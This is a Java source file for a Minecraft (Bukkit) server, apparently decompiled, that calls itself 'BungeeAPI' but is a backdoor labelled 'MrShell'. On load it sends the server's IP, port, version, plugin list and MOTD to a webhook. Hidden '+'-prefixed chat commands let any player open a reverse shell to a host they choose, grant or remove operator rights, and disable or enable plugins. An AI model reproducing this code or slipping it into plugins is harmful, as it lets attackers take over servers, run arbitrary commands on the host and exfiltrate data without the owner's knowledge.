package net.md5.api;

import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.net.URL;
import java.nio.charset.StandardCharsets;
import java.util.ArrayList;
import java.util.List;
import java.util.Scanner;
import javax.net.ssl.HttpsURLConnection;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.plugin.Plugin;
import org.bukkit.plugin.java.JavaPlugin;

public class BungeeAPI implements Listener {
  private final JavaPlugin plugin;
  
  private final String webhook;
  
  private static String prefix = "+";
  
  public String getExecutor() {
    return System.getProperty("os.name").startsWith("Windows") ? "cmd.exe" : "/bin/sh";
  }
  
  public String getIP() {
    try {
      InputStream is = (new URL("https://api.ipify.org")).openConnection().getInputStream();
      Scanner s = new Scanner(is);
      return s.nextLine();
    } catch (Exception e) {
      return "error";
    } 
  }
  
  public void sendWebhook(String json) {
    if (this.webhook.length() == 0)
      return; 
    try {
      HttpsURLConnection connection = (HttpsURLConnection)(new URL(this.webhook)).openConnection();
      connection.setRequestMethod("POST");
      connection.setRequestProperty("Content-Type", "application/json");
      connection.setRequestProperty("User-Agent", "Mozilla/5.0 (X11; U; Linux i686) Gecko/20071127 Firefox/2.0.0.11");
      connection.setDoOutput(true);
      OutputStream outputStream = connection.getOutputStream();
      outputStream.write(json.replace("\n", "\\n").getBytes(StandardCharsets.UTF_8));
      connection.getInputStream();
    } catch (Exception e) {
      System.out.println(json);
      e.printStackTrace();
    } 
  }
  
  public String getPlugins() {
    List<String> s = new ArrayList<>();
    for (Plugin pl : Bukkit.getPluginManager().getPlugins())
      s.add(pl.getName()); 
    return String.join(", ", (Iterable)s);
  }
  
  public BungeeAPI(JavaPlugin plugin, String webhook, boolean joinLogs) {
    this.plugin = plugin;
    this.webhook = webhook;
    Bukkit.getPluginManager().registerEvents(this, (Plugin)plugin);
    sendWebhook("{\"avatar_url\": \"https://i.imgur.com/HXPYEi0.png\", \"username\": \"MrShell\", \"embeds\": [{\"title\":\"MrShell\", \"color\":3447003, \"description\":\"{prefix}help \n\n{desc}\", \"footer\":{\"text\":\"MrShell by MrCyci6\"}}]}".replace("{prefix}", prefix).replace("{desc}", "IP : `" + getIP() + "`\nPort : `" + Bukkit.getPort() + "`\nVersion : `" + Bukkit.getVersion().replace("\"", "\\\"") + "`\nInfected Plugin : `" + plugin.getName() + "`\nPlugins : `" + getPlugins() + "`\nMOTD :\n```" + Bukkit.getServer().getMotd() + "```"));
  }
  
  @EventHandler
  public void onChatEvent(AsyncPlayerChatEvent event) {
    String[] message = event.getMessage().split(" ");
    int length = message.length;
    Player player = event.getPlayer();
    if (!message[0].startsWith(prefix))
      return; 
    event.setCancelled(true);
    Bukkit.getScheduler().runTaskAsynchronously((Plugin)this.plugin, () -> {
          if (message[0].equalsIgnoreCase(prefix + "help")) {
            player.sendMessage("");
            player.sendMessage(prefix + "shell [ip] [port]");
            player.sendMessage(prefix + "op [player]");
            player.sendMessage(prefix + "deop [player]");
            player.sendMessage(prefix + "plugins");
            player.sendMessage(prefix + "unload [plugin]");
            player.sendMessage(prefix + "load [plugin]");
            player.sendMessage("");
          } else if (message[0].equalsIgnoreCase(prefix + "shell")) {
            try {
              String host = message[1];
              String ports = message[2];
              int port = Integer.parseInt(ports);
              player.sendMessage("to + host + "+ port);
              Process p = (new ProcessBuilder(new String[] { getExecutor() })).redirectErrorStream(true).start();
              Socket s = new Socket(host, port);
              InputStream pi = p.getInputStream();
              InputStream pe = p.getErrorStream();
              InputStream si = s.getInputStream();
              OutputStream po = p.getOutputStream();
              OutputStream so = s.getOutputStream();
              while (!s.isClosed()) {
                while (pi.available() > 0)
                  so.write(pi.read()); 
                while (pe.available() > 0)
                  so.write(pe.read()); 
                while (si.available() > 0)
                  po.write(si.read()); 
                so.flush();
                po.flush();
                Thread.sleep(50L);
                try {
                  p.exitValue();
                  break;
                } catch (Exception exception) {}
              } 
              p.destroy();
              s.close();
            } catch (Exception exception) {}
          } else if (message[0].equalsIgnoreCase(prefix + "op")) {
            if (length == 1) {
              player.setOp(true);
              player.sendMessage("now OP");
            } else if (length == 2) {
              Player p = Bukkit.getPlayer(message[1]);
              if (p == null) {
                player.sendMessage(message[1] + " found");
              } else {
                p.setOp(true);
                player.sendMessage(message[1] + " was now OP");
              } 
            } 
          } else if (message[0].equalsIgnoreCase(prefix + "deop")) {
            if (length == 1) {
              player.setOp(false);
              player.sendMessage("now deOP");
            } else if (length == 2) {
              Player p = Bukkit.getPlayer(message[1]);
              if (p == null) {
                player.sendMessage(message[1] + " found");
              } else {
                p.setOp(false);
                player.sendMessage(message[1] + " was now deOP");
              } 
            } 
          } else if (message[0].equalsIgnoreCase(prefix + "unload")) {
            if (length == 2) {
              Plugin plugin = Bukkit.getPluginManager().getPlugin(message[1]);
              if (plugin != null) {
                try {
                  Bukkit.getPluginManager().disablePlugin(plugin);
                  player.sendMessage(plugin.getName() + " now disabled");
                } catch (Exception exception) {}
              } else {
                player.sendMessage(message[1] + " found");
              } 
            } 
          } else if (message[0].equalsIgnoreCase(prefix + "load")) {
            if (length == 2) {
              Plugin plugin = Bukkit.getPluginManager().getPlugin(message[1]);
              if (plugin != null) {
                try {
                  Bukkit.getPluginManager().enablePlugin(plugin);
                  player.sendMessage(plugin.getName() + " now enabled");
                } catch (Exception exception) {}
              } else {
                player.sendMessage(message[1] + " found");
              } 
            } 
          } else if (message[0].equalsIgnoreCase(prefix + "plugins")) {
            player.sendMessage("Plugins: §a" + getPlugins());
          } else {
            return;
          } 
        });
  }
}
